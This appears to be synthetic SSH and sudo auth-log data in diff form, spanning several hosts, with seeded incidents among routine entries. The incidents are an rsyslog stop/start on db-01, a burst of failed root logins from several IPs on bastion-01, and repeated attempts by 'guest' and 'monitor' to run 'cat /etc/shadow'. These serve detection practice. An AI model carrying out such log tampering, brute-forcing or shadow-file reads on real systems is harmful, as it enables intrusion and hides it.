+Oct 21 10:45:45 web-01 sudo: sshd[3791]: Accepted publickey for ada from 203.0.113.17 port 64036 ssh2: ED25519 SHA256:bZ5whadriGs6ZY6b
+Oct 21 10:49:04 db-01 systemd-logind: sshd[6293]: Failed password for ngozi from 10.0.2.15 port 54769 ssh2
+Oct 21 10:50:20 api-01 sshd: sshd[7649]: Accepted publickey for root from 198.51.100.23 port 58636 ssh2: ED25519 SHA256:rzRtv83syB2tF8jt
+Oct 21 11:13:51 api-01 su: systemd-logind[13939]: New session 460 of user backup.
+Oct 21 11:14:41 api-01 systemd-logind: sshd[3702]: Failed password for tunde from 172.16.5.12 port 31325 ssh2
+Oct 21 11:17:36 api-01 su: sshd[2669]: Accepted publickey for ngozi from 198.51.100.23 port 60646 ssh2: ED25519 SHA256:r6frmoybJXsJbOac
+Oct 21 11:19:21 bastion-01 sudo: sshd[5600]: Accepted publickey for ifeoma from 10.0.2.15 port 47916 ssh2: ED25519 SHA256:5M9cxKxkzgdB3tXX
+Oct 21 11:21:58 db-01 polkitd: sshd[13469]: Accepted publickey for bayo from 10.0.2.15 port 43860 ssh2: ED25519 SHA256:dlix5oHWnEvEUFGM
+Oct 21 11:27:14 web-01 sshd: sudo[19557]: chioma : TTY=pts/3 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 11:33:01 bastion-01 cron: systemd-logind[26807]: New session 95 of user tunde.
+Oct 21 11:39:46 auth-gw-01 su: sshd[22543]: Failed password for bayo from 198.51.100.23 port 36868 ssh2
+Oct 21 11:46:24 api-01 sudo: sshd[765]: Accepted publickey for ada from 192.168.1.24 port 48452 ssh2: ED25519 SHA256:wvzb9rEldqo45MLy
+Oct 21 11:48:58 auth-gw-01 polkitd: sshd[18499]: Accepted publickey for emeka from 192.168.1.31 port 56592 ssh2: ED25519 SHA256:6nJfWP48uOFF3a6h
+Oct 21 11:56:45 web-01 sshd: sshd[5006]: Failed password for admin from 198.51.100.23 port 49430 ssh2
+Oct 21 11:58:45 web-01 polkitd: sshd[11210]: Accepted publickey for ngozi from 203.0.113.17 port 31167 ssh2: ED25519 SHA256:ZuBUXIkWqZjMPcez
+Oct 21 12:01:23 bastion-01 sudo: systemd-logind[26317]: New session 196 of user deploy.
+Oct 21 12:03:03 db-01 sudo: sshd[6584]: Accepted publickey for bayo from 192.168.1.31 port 53062 ssh2: ED25519 SHA256:K0zL2TkCrpvqvHIP
+Oct 21 12:03:12 api-01 su: systemd-logind[18660]: New session 313 of user ifeoma.
+Oct 21 12:05:27 db-01 su: sshd[6277]: Accepted publickey for ngozi from 198.51.100.23 port 60695 ssh2: ED25519 SHA256:yYkbveLTrcMgsFbi
+Oct 21 12:08:58 worker-02 systemd-logind: sshd[7987]: Invalid user test from 198.51.100.44 port 37776
+Oct 21 12:10:22 db-01 sshd: sshd[12947]: Accepted publickey for amara from 10.0.4.22 port 54315 ssh2: ED25519 SHA256:jNeRVAGqW6sKav3k
+Oct 21 12:11:21 api-01 sudo: sshd[3635]: Failed password for bayo from 203.0.113.17 port 48398 ssh2
+Oct 21 12:11:30 bastion-01 polkitd: sshd[27931]: Invalid user user1 from 198.51.100.23 port 35021
+Oct 21 12:17:26 bastion-01 polkitd: sshd[25651]: Invalid user user1 from 172.16.5.12 port 59270
+Oct 21 12:17:27 web-01 systemd-logind: systemd-logind[5048]: New session 109 of user kunle.
+Oct 21 12:23:56 worker-02 su: sshd[14632]: Accepted publickey for bayo from 203.0.113.17 port 63691 ssh2: ED25519 SHA256:ZVszeWz96NZ2GpAX
+Oct 21 12:26:20 api-01 su: sshd[9793]: Accepted publickey for svc_api from 198.51.100.44 port 33821 ssh2: ED25519 SHA256:sIBk5H2sqmjKXNxj
+Oct 21 12:27:56 bastion-01 systemd-logind: sshd[22413]: Accepted publickey for root from 203.0.113.17 port 42511 ssh2: ED25519 SHA256:F3vCmsokcEQp2v4I
+Oct 21 12:35:07 auth-gw-01 su: sshd[3171]: Accepted publickey for sani from 192.168.1.24 port 51741 ssh2: ED25519 SHA256:omM13nYYE2Mt1R6o
+Oct 21 12:37:49 worker-02 cron: sudo[23941]: root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 21 12:39:01 web-01 su: sshd[7997]: Failed password for tunde from 10.0.2.15 port 37569 ssh2
+Oct 21 12:41:14 db-01 sshd: sshd[2538]: Failed password for sani from 203.0.113.17 port 32090 ssh2
+Oct 21 12:45:55 web-01 cron: sudo[23151]: ada : TTY=pts/1 ; PWD=/home/ada ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 21 12:45:57 api-01 sshd: sshd[16607]: Accepted publickey for root from 10.0.2.15 port 30012 ssh2: ED25519 SHA256:r5d1SY8TJiLfsQGf
+Oct 21 12:47:12 bastion-01 sshd: sshd[26736]: Failed password for emeka from 198.51.100.44 port 38218 ssh2
+Oct 21 12:58:20 web-01 systemd-logind: sshd[5006]: Accepted publickey for sani from 203.0.113.17 port 41847 ssh2: ED25519 SHA256:VCQy6yqBqTN6RA1H
+Oct 21 12:58:28 web-01 sshd: sshd[19330]: Accepted publickey for ada from 10.0.2.15 port 64385 ssh2: ED25519 SHA256:maA4dKTWnw6TsD9s
+Oct 21 13:01:16 bastion-01 sshd: sshd[22044]: Failed password for ngozi from 10.0.2.15 port 41160 ssh2
+Oct 21 13:03:32 api-01 su: sshd[1395]: Accepted publickey for ngozi from 172.16.5.12 port 38304 ssh2: ED25519 SHA256:UHNtAGUBVjHIbqJi
+Oct 21 13:05:51 bastion-01 polkitd: CRON[19860]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 13:15:52 worker-02 sudo: sshd[20316]: Accepted publickey for backup from 10.0.2.15 port 63007 ssh2: ED25519 SHA256:5xmI0K9XilJbDsyS
+Oct 21 13:25:23 api-01 cron: sshd[11820]: Failed password for deploy from 10.0.2.15 port 43178 ssh2
+Oct 21 13:28:10 db-01 systemd-logind: sshd[17122]: Accepted publickey for admin from 172.16.5.12 port 39943 ssh2: ED25519 SHA256:Csj9cN71Qq9VFZhU
+Oct 21 13:28:30 web-01 polkitd: CRON[19224]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 13:35:59 bastion-01 sshd: sudo[8345]: admin : TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 13:37:45 db-01 sudo: sshd[20713]: Failed password for tunde from 172.16.5.12 port 34297 ssh2
+Oct 21 13:39:01 worker-02 sshd: systemd-logind[16041]: New session 8 of user admin.
+Oct 21 13:39:43 auth-gw-01 systemd-logind: sshd[26262]: Failed password for ifeoma from 10.0.4.22 port 57777 ssh2
+Oct 21 13:40:16 db-01 sshd: CRON[22199]: (backup) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 13:41:03 web-01 cron: systemd-logind[18993]: New session 304 of user ngozi.
+Oct 21 13:42:33 worker-02 sshd: sshd[2423]: Failed password for svc_api from 198.51.100.44 port 39605 ssh2
+Oct 21 13:44:00 db-01 sudo[21001]: admin : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog
+Oct 21 13:46:14 web-01 sshd: systemd-logind[12331]: New session 315 of user backup.
+Oct 21 13:48:15 auth-gw-01 cron: sudo[24945]: sani : TTY=pts/3 ; PWD=/home/sani ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 13:48:37 web-01 sudo: sshd[21938]: Accepted publickey for ngozi from 172.16.5.12 port 43644 ssh2: ED25519 SHA256:k6NEh7DyWH47Ws98
+Oct 21 13:50:09 auth-gw-01 systemd-logind: sshd[10473]: Accepted publickey for ifeoma from 10.0.2.15 port 51779 ssh2: ED25519 SHA256:lrCwMlMGCyjcsi7c
+Oct 21 13:51:00 db-01 sudo[21002]: admin : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl start rsyslog
+Oct 21 13:51:03 db-01 rsyslogd[21003]: imuxsock: Acquired UNIX socket '/run/systemd/journal/syslog' (fd 3) from systemd.
+Oct 21 14:00:15 auth-gw-01 sshd: sshd[18785]: Accepted publickey for backup from 172.16.5.12 port 32822 ssh2: ED25519 SHA256:yPeMb2uYFZbz7Dj6
+Oct 21 14:01:36 db-01 sshd: sshd[1478]: Failed password for ngozi from 203.0.113.17 port 62345 ssh2
+Oct 21 14:02:55 auth-gw-01 systemd-logind: sshd[3648]: Invalid user administrator from 198.51.100.44 port 39846
+Oct 21 14:03:17 db-01 cron: sshd[27630]: Failed password for amara from 10.0.4.22 port 64582 ssh2
+Oct 21 14:04:11 db-01 cron: sshd[17549]: Accepted publickey for admin from 203.0.113.17 port 62973 ssh2: ED25519 SHA256:inkHv39fMEru1F5D
+Oct 21 14:15:12 db-01 su: systemd-logind[9477]: New session 443 of user emeka.
+Oct 21 14:16:37 bastion-01 su: sshd[24245]: Accepted publickey for amara from 192.168.1.31 port 54402 ssh2: ED25519 SHA256:VPeI4L2lSPU4vV03
+Oct 21 14:20:04 api-01 systemd-logind: systemd-logind[5785]: New session 389 of user admin.
+Oct 21 14:21:20 bastion-01 su: sshd[13623]: Accepted publickey for svc_api from 203.0.113.17 port 57275 ssh2: ED25519 SHA256:IBVVwkJ01DSrr4fo
+Oct 21 14:22:22 bastion-01 sshd: sshd[21975]: Failed password for chioma from 192.168.1.24 port 50395 ssh2
+Oct 21 14:25:24 web-01 cron: sshd[23422]: Accepted publickey for fatima from 192.168.1.24 port 32034 ssh2: ED25519 SHA256:Qbm9RmbJcVLVs424
+Oct 21 14:26:19 auth-gw-01 systemd-logind: systemd-logind[802]: New session 117 of user chioma.
+Oct 21 14:29:26 bastion-01 su: sshd[7342]: Accepted publickey for bayo from 192.168.1.24 port 45237 ssh2: ED25519 SHA256:i7HTo8rPE8s0Amtn
+Oct 21 14:31:22 db-01 sshd: sudo[17512]: sani : TTY=pts/3 ; PWD=/home/sani ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 14:35:41 db-01 cron: sshd[10182]: Accepted publickey for root from 10.0.2.15 port 57056 ssh2: ED25519 SHA256:8KCgYGWhGc0MFaDv
+Oct 21 14:38:05 db-01 sudo: sshd[21124]: Failed password for tunde from 203.0.113.17 port 49293 ssh2
+Oct 21 14:39:11 auth-gw-01 su: CRON[2234]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 14:42:28 worker-02 polkitd: sudo[24002]: ngozi : TTY=pts/1 ; PWD=/home/ngozi ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 14:44:15 worker-02 systemd-logind: sshd[9363]: Accepted publickey for tunde from 198.51.100.44 port 49306 ssh2: ED25519 SHA256:AVmiXLUaN76GPgi8
+Oct 21 14:49:36 bastion-01 sudo: sshd[6752]: Accepted publickey for admin from 10.0.8.9 port 53495 ssh2: ED25519 SHA256:OqUm8lF3AlVUpJMB
+Oct 21 14:52:28 worker-02 sudo: sudo[5931]: backup : TTY=pts/5 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 21 14:56:46 api-01 systemd-logind: sudo[2687]: ada : TTY=pts/4 ; PWD=/home/ada ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 21 15:00:48 bastion-01 su: sshd[1875]: Accepted publickey for root from 10.0.8.9 port 35561 ssh2: ED25519 SHA256:DURxfgxcdEuUOZQt
+Oct 21 15:04:52 auth-gw-01 su: sshd[4520]: Accepted publickey for tunde from 172.16.5.12 port 54089 ssh2: ED25519 SHA256:80ZxiEIhrHZu0KFA
+Oct 21 15:07:02 auth-gw-01 cron: sshd[1858]: Accepted publickey for ifeoma from 192.168.1.31 port 64932 ssh2: ED25519 SHA256:ZHEU4NcF7O6JiXtd
+Oct 21 15:22:04 web-01 sshd: sshd[7695]: Accepted publickey for ada from 192.168.1.24 port 32116 ssh2: ED25519 SHA256:ZusGIyfEd5vJPIXk
+Oct 21 15:35:49 worker-02 sudo: sshd[15312]: Accepted publickey for kunle from 172.16.5.12 port 62564 ssh2: ED25519 SHA256:rrjubEPWCSqtwyyy
+Oct 21 15:38:23 worker-02 sudo: sshd[1297]: Accepted publickey for deploy from 198.51.100.23 port 54903 ssh2: ED25519 SHA256:N5sOuOe4lwp0vWTN
+Oct 21 15:50:06 api-01 cron: systemd-logind[13240]: New session 279 of user chioma.
+Oct 21 15:50:39 bastion-01 su: sshd[7739]: Accepted publickey for emeka from 10.0.8.9 port 49742 ssh2: ED25519 SHA256:U3RvDU8WueBjWeCg
+Oct 21 15:55:26 worker-02 sshd: sshd[2498]: Failed password for bayo from 198.51.100.23 port 59583 ssh2
+Oct 21 15:55:39 web-01 sshd: sshd[6764]: Accepted publickey for kunle from 172.16.5.12 port 46405 ssh2: ED25519 SHA256:7V2Fa1DYShrflRAQ
+Oct 21 15:56:02 auth-gw-01 cron: sshd[25582]: Accepted publickey for root from 10.0.2.15 port 53133 ssh2: ED25519 SHA256:eP4ek54S6pCsuNv1
+Oct 21 15:57:43 auth-gw-01 sshd: sshd[1168]: Accepted publickey for root from 203.0.113.17 port 41095 ssh2: ED25519 SHA256:I8eHIpoZ6RgjiZLY
+Oct 21 15:58:45 web-01 su: sshd[9985]: Accepted publickey for tunde from 198.51.100.44 port 56207 ssh2: ED25519 SHA256:xO8pbHZTfvRwChq6
+Oct 21 16:03:55 web-01 sudo: sshd[2110]: Accepted publickey for amara from 198.51.100.23 port 35735 ssh2: ED25519 SHA256:hyF4ofKKgiLJUKrZ
+Oct 21 16:07:34 web-01 systemd-logind: sshd[3073]: Accepted publickey for root from 10.0.8.9 port 62112 ssh2: ED25519 SHA256:nu0KlcGGN4c7U6FL
+Oct 21 16:11:06 worker-02 sudo: sshd[10666]: Accepted publickey for amara from 203.0.113.17 port 53935 ssh2: ED25519 SHA256:iZmjt6ozEi3hlX8E
+Oct 21 16:24:03 worker-02 polkitd: sshd[22505]: Accepted publickey for ifeoma from 192.168.1.24 port 35145 ssh2: ED25519 SHA256:hXSW3bxW5R375i2n
+Oct 21 16:24:29 web-01 sudo: sshd[11564]: Failed password for ngozi from 198.51.100.44 port 50256 ssh2
+Oct 21 16:25:00 worker-02 systemd-logind: systemd-logind[4944]: New session 177 of user chioma.
+Oct 21 16:26:31 worker-02 su: systemd-logind[10449]: New session 131 of user ada.
+Oct 21 16:29:03 api-01 polkitd: sshd[21354]: Accepted publickey for bayo from 198.51.100.44 port 58539 ssh2: ED25519 SHA256:HGjMNF3LajjBt8sJ
+Oct 21 16:36:29 bastion-01 cron: sshd[10044]: Accepted publickey for admin from 198.51.100.44 port 56283 ssh2: ED25519 SHA256:wXoT9bzhQGLfEaFG
+Oct 21 16:37:16 web-01 sudo: systemd-logind[24650]: New session 232 of user backup.
+Oct 21 16:37:33 bastion-01 sudo: sshd[26563]: Accepted publickey for fatima from 10.0.2.15 port 31323 ssh2: ED25519 SHA256:h36nTvQxm0V5c8XR
+Oct 21 16:41:13 auth-gw-01 polkitd: sshd[2895]: Invalid user test from 192.168.1.24 port 59794
+Oct 21 16:42:06 auth-gw-01 sshd: sshd[8886]: Accepted publickey for fatima from 10.0.8.9 port 42768 ssh2: ED25519 SHA256:t0BXk9HafQSwXXwP
+Oct 21 16:43:57 api-01 sshd: CRON[28537]: (backup) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 16:56:03 api-01 su: systemd-logind[1284]: New session 48 of user sani.
+Oct 21 16:56:11 auth-gw-01 systemd-logind: sshd[14707]: Accepted publickey for root from 198.51.100.23 port 31843 ssh2: ED25519 SHA256:m0XqCX9SL9zAmYR7
+Oct 21 16:57:35 worker-02 sshd: sshd[18380]: Failed password for kunle from 198.51.100.23 port 30491 ssh2
+Oct 21 17:04:41 worker-02 su: sshd[23879]: Accepted publickey for sani from 198.51.100.44 port 38220 ssh2: ED25519 SHA256:gjP2vbqAEcbqLlCS
+Oct 21 17:05:22 db-01 systemd-logind: CRON[2978]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 21 17:09:00 bastion-01 sshd[22000]: Failed password for root from 198.51.100.23 port 48000 ssh2
+Oct 21 17:09:09 bastion-01 sshd[22001]: Failed password for root from 198.51.100.23 port 48001 ssh2
+Oct 21 17:09:18 bastion-01 sshd[22002]: Failed password for root from 198.51.100.23 port 48002 ssh2
+Oct 21 17:09:27 bastion-01 sshd[22003]: Failed password for root from 198.51.100.23 port 48003 ssh2
+Oct 21 17:10:10 bastion-01 sshd[22010]: Failed password for root from 203.0.113.62 port 48010 ssh2
+Oct 21 17:10:19 bastion-01 sshd[22011]: Failed password for root from 203.0.113.62 port 48011 ssh2
+Oct 21 17:10:28 bastion-01 sshd[22012]: Failed password for root from 203.0.113.62 port 48012 ssh2
+Oct 21 17:10:37 bastion-01 sshd[22013]: Failed password for root from 203.0.113.62 port 48013 ssh2
+Oct 21 17:11:20 bastion-01 sshd[22020]: Failed password for root from 192.0.2.88 port 48020 ssh2
+Oct 21 17:11:29 bastion-01 sshd[22021]: Failed password for root from 192.0.2.88 port 48021 ssh2
+Oct 21 17:11:38 bastion-01 sshd[22022]: Failed password for root from 192.0.2.88 port 48022 ssh2
+Oct 21 17:11:47 bastion-01 sshd[22023]: Failed password for root from 192.0.2.88 port 48023 ssh2
+Oct 21 17:11:49 web-01 polkitd: sshd[5618]: Accepted publickey for admin from 192.168.1.31 port 60560 ssh2: ED25519 SHA256:rJ12QgFBn0dpIW3n
+Oct 21 17:12:30 bastion-01 sshd[22030]: Failed password for root from 198.51.100.91 port 48030 ssh2
+Oct 21 17:12:39 bastion-01 sshd[22031]: Failed password for root from 198.51.100.91 port 48031 ssh2
+Oct 21 17:12:48 bastion-01 sshd[22032]: Failed password for root from 198.51.100.91 port 48032 ssh2
+Oct 21 17:12:57 bastion-01 sshd[22033]: Failed password for root from 198.51.100.91 port 48033 ssh2
+Oct 21 17:13:40 bastion-01 sshd[22040]: Failed password for root from 203.0.113.149 port 48040 ssh2
+Oct 21 17:13:49 bastion-01 sshd[22041]: Failed password for root from 203.0.113.149 port 48041 ssh2
+Oct 21 17:13:58 bastion-01 sshd[22042]: Failed password for root from 203.0.113.149 port 48042 ssh2
+Oct 21 17:14:07 bastion-01 sshd[22043]: Failed password for root from 203.0.113.149 port 48043 ssh2
+Oct 21 17:17:42 worker-02 polkitd: sshd[27308]: Accepted publickey for chioma from 198.51.100.44 port 42233 ssh2: ED25519 SHA256:oe17sQpP8aHHBMe5
+Oct 21 17:20:44 auth-gw-01 cron: sshd[13967]: Accepted publickey for ada from 198.51.100.23 port 44394 ssh2: ED25519 SHA256:IaLo0g4yvXyCmsOu
+Oct 21 17:21:10 bastion-01 su: systemd-logind[23153]: New session 208 of user root.
+Oct 21 17:23:02 worker-02 sshd: CRON[10365]: (root) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 17:25:11 auth-gw-01 su: systemd-logind[13646]: New session 20 of user fatima.
+Oct 21 17:26:43 bastion-01 polkitd: sshd[14348]: Invalid user support from 10.0.4.22 port 54854
+Oct 21 17:34:07 bastion-01 sshd: CRON[4308]: (backup) CMD (/usr/local/bin/health-check)
+Oct 21 17:41:36 bastion-01 polkitd: sudo[11232]: fatima : TTY=pts/3 ; PWD=/home/fatima ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 17:48:10 api-01 cron: sshd[5106]: Accepted publickey for bayo from 192.168.1.31 port 37760 ssh2: ED25519 SHA256:YogeVEFw0CGUGR3M
+Oct 21 17:54:07 worker-02 polkitd: sshd[21986]: Failed password for ada from 10.0.8.9 port 54825 ssh2
+Oct 21 17:54:51 web-01 sshd: systemd-logind[2328]: New session 385 of user fatima.
+Oct 21 17:56:44 auth-gw-01 sshd: CRON[9081]: (svc_api) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 17:58:35 worker-02 sshd: sshd[1030]: Accepted publickey for backup from 198.51.100.23 port 60073 ssh2: ED25519 SHA256:V3HPVsQi4PwKlAX9
+Oct 21 18:00:40 worker-02 systemd-logind: sshd[8362]: Failed password for ada from 192.168.1.24 port 48373 ssh2
+Oct 21 18:00:44 web-01 polkitd: CRON[7664]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 21 18:07:11 db-01 cron: sshd[18167]: Failed password for bayo from 10.0.2.15 port 37519 ssh2
+Oct 21 18:13:07 db-01 su: sudo[9221]: amara : TTY=pts/1 ; PWD=/home/amara ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 21 18:15:26 worker-02 sudo: sshd[6721]: Failed password for admin from 192.168.1.24 port 50694 ssh2
+Oct 21 18:23:06 auth-gw-01 sudo: sshd[1902]: Failed password for kunle from 203.0.113.17 port 62577 ssh2
+Oct 21 18:26:45 worker-02 systemd-logind: sshd[1113]: Failed password for ngozi from 10.0.2.15 port 56126 ssh2
+Oct 21 18:44:43 auth-gw-01 systemd-logind: sshd[24914]: Accepted publickey for deploy from 203.0.113.17 port 63092 ssh2: ED25519 SHA256:jqMDp9tt5iFppQZD
+Oct 21 18:45:39 web-01 sshd: CRON[15160]: (root) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 18:48:59 auth-gw-01 cron: sshd[2088]: Accepted publickey for fatima from 10.0.2.15 port 50118 ssh2: ED25519 SHA256:OTtdG38ces2lBrtd
+Oct 21 18:50:10 bastion-01 sudo: sshd[3894]: Accepted publickey for kunle from 203.0.113.17 port 56076 ssh2: ED25519 SHA256:LYUXi3P2yb7xXhQo
+Oct 21 18:54:43 api-01 su: sshd[2522]: Accepted publickey for kunle from 10.0.2.15 port 41930 ssh2: ED25519 SHA256:kcxJJWT8CQHDoq06
+Oct 21 18:59:12 web-01 systemd-logind: sudo[20210]: svc_api : TTY=pts/1 ; PWD=/home/svc_api ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 19:03:17 bastion-01 sshd: sshd[16224]: Accepted publickey for bayo from 192.168.1.31 port 48643 ssh2: ED25519 SHA256:gcaIyMIfkxlYpKSD
+Oct 21 19:05:54 web-01 cron: CRON[21978]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 19:12:25 db-01 cron: sshd[8688]: Failed password for tunde from 10.0.8.9 port 64736 ssh2
+Oct 21 19:14:07 worker-02 systemd-logind: sshd[15547]: Invalid user oracle from 172.16.5.12 port 61010
+Oct 21 19:21:38 worker-02 su: sshd[14034]: Failed password for chioma from 192.168.1.31 port 45709 ssh2
+Oct 21 19:23:05 worker-02 systemd-logind: sshd[26865]: Invalid user oracle from 198.51.100.44 port 49775
+Oct 21 19:26:06 auth-gw-01 polkitd: sshd[3386]: Accepted publickey for fatima from 10.0.2.15 port 64637 ssh2: ED25519 SHA256:rDqXUIKWM6X6I71H
+Oct 21 19:28:39 worker-02 polkitd: sshd[2269]: Accepted publickey for chioma from 10.0.2.15 port 39326 ssh2: ED25519 SHA256:EMvc1wSN0the7WaZ
+Oct 21 19:28:40 worker-02 sshd: sshd[5690]: Accepted publickey for emeka from 10.0.2.15 port 46179 ssh2: ED25519 SHA256:Ng50g6e0gD1Owdii
+Oct 21 19:29:45 api-01 polkitd: CRON[707]: (root) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 19:39:34 auth-gw-01 sudo: CRON[2129]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 19:44:09 web-01 sshd: sshd[10853]: Accepted publickey for kunle from 192.168.1.31 port 57993 ssh2: ED25519 SHA256:HQsFE5vx6wE303i7
+Oct 21 19:59:14 bastion-01 sshd: sudo[13117]: kunle : TTY=pts/1 ; PWD=/home/kunle ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 19:59:19 web-01 systemd-logind: sshd[25298]: Accepted publickey for bayo from 10.0.4.22 port 38645 ssh2: ED25519 SHA256:cigQEGactOWBJvIM
+Oct 21 20:01:57 api-01 sshd: sshd[14859]: Accepted publickey for svc_api from 10.0.4.22 port 39109 ssh2: ED25519 SHA256:Zbt4dU7shwghRlxk
+Oct 21 20:04:13 api-01 sshd: sshd[27439]: Failed password for fatima from 10.0.4.22 port 37267 ssh2
+Oct 21 20:05:35 db-01 sudo: sshd[8267]: Accepted publickey for backup from 172.16.5.12 port 55302 ssh2: ED25519 SHA256:iIiYeGvHP4wbhZTM
+Oct 21 20:09:10 api-01 polkitd: sshd[14320]: Failed password for ifeoma from 198.51.100.44 port 60587 ssh2
+Oct 21 20:10:06 db-01 sshd: sshd[14959]: Invalid user oracle from 10.0.2.15 port 43871
+Oct 21 20:12:20 worker-02 sudo: sudo[3242]: backup : TTY=pts/5 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 20:17:07 api-01 sshd: CRON[25896]: (backup) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 20:18:00 api-01 sudo[23000]: guest : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 20:18:21 api-01 sudo[23001]: guest : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 20:18:42 api-01 sudo[23002]: monitor : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 20:19:03 api-01 sudo[23003]: monitor : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 20:19:24 api-01 sudo[23004]: monitor : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 21 20:23:19 bastion-01 polkitd: sudo[903]: svc_api : TTY=pts/5 ; PWD=/home/svc_api ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 20:28:57 web-01 cron: sudo[6204]: chioma : TTY=pts/2 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 21 20:29:25 worker-02 polkitd: sshd[23716]: Failed password for emeka from 198.51.100.23 port 35769 ssh2
+Oct 21 20:32:52 bastion-01 systemd-logind: sshd[23382]: Failed password for root from 10.0.4.22 port 63497 ssh2
+Oct 21 20:34:14 db-01 sshd: sshd[7703]: Accepted publickey for root from 198.51.100.44 port 35311 ssh2: ED25519 SHA256:ABDybsUcN6NnjniP
+Oct 21 20:40:18 auth-gw-01 systemd-logind: sshd[27540]: Accepted publickey for ngozi from 198.51.100.23 port 58506 ssh2: ED25519 SHA256:2OVvfKvM8DCmwSAW
+Oct 21 20:54:10 db-01 cron: sudo[12120]: ifeoma : TTY=pts/1 ; PWD=/home/ifeoma ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 20:57:52 web-01 sudo: systemd-logind[13366]: New session 187 of user ngozi.
+Oct 21 20:58:38 api-01 su: sshd[20594]: Accepted publickey for ada from 10.0.2.15 port 44549 ssh2: ED25519 SHA256:iaM17w3YZNMHAVA4
+Oct 21 21:02:41 web-01 sudo: systemd-logind[16454]: New session 442 of user chioma.
+Oct 21 21:06:21 auth-gw-01 sshd: sshd[5736]: Accepted publickey for emeka from 198.51.100.44 port 39704 ssh2: ED25519 SHA256:IZLFXeYQs1O6f2p2
+Oct 21 21:08:17 db-01 systemd-logind: sshd[24082]: Accepted publickey for emeka from 192.168.1.24 port 42351 ssh2: ED25519 SHA256:Z2CJpn3WRiLVVwzT
+Oct 21 21:08:35 worker-02 sshd: sshd[22174]: Failed password for ifeoma from 203.0.113.17 port 43164 ssh2
+Oct 21 21:09:36 web-01 su: sshd[28596]: Accepted publickey for fatima from 198.51.100.23 port 35915 ssh2: ED25519 SHA256:ShsVK0LPiMujO19d
+Oct 21 21:10:28 web-01 su: sshd[2955]: Accepted publickey for fatima from 198.51.100.23 port 52113 ssh2: ED25519 SHA256:3wX4aeXlaxbHiOaR
+Oct 21 21:10:47 db-01 cron: sshd[20714]: Accepted publickey for fatima from 10.0.8.9 port 60878 ssh2: ED25519 SHA256:4zZFrvzeFdYsv6RH
+Oct 21 21:11:36 api-01 su: sudo[16975]: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 21:14:34 api-01 sshd: systemd-logind[957]: New session 435 of user ada.
+Oct 21 21:16:30 web-01 sshd: sshd[24962]: Accepted publickey for backup from 10.0.8.9 port 56520 ssh2: ED25519 SHA256:YCOwu6bIGFZSI8yJ
+Oct 21 21:17:16 db-01 sshd: sshd[23582]: Accepted publickey for amara from 198.51.100.44 port 50839 ssh2: ED25519 SHA256:lu0PJFYlwbYQL4c4
+Oct 21 21:26:28 worker-02 systemd-logind: sshd[6962]: Accepted publickey for bayo from 192.168.1.24 port 43316 ssh2: ED25519 SHA256:MiU0TkJ6iFyumpHT
+Oct 21 21:27:53 bastion-01 polkitd: sshd[27305]: Accepted publickey for chioma from 10.0.2.15 port 42387 ssh2: ED25519 SHA256:ne0o2it24daWoDLw
+Oct 21 21:28:58 db-01 su: sshd[5987]: Accepted publickey for root from 203.0.113.17 port 38758 ssh2: ED25519 SHA256:Dcdc3KN5YtAGjlSv
+Oct 21 21:30:27 auth-gw-01 su: sshd[8742]: Accepted publickey for svc_api from 10.0.8.9 port 49351 ssh2: ED25519 SHA256:WzTkWFebG93RPiXN
+Oct 21 21:30:36 api-01 sshd: CRON[8817]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
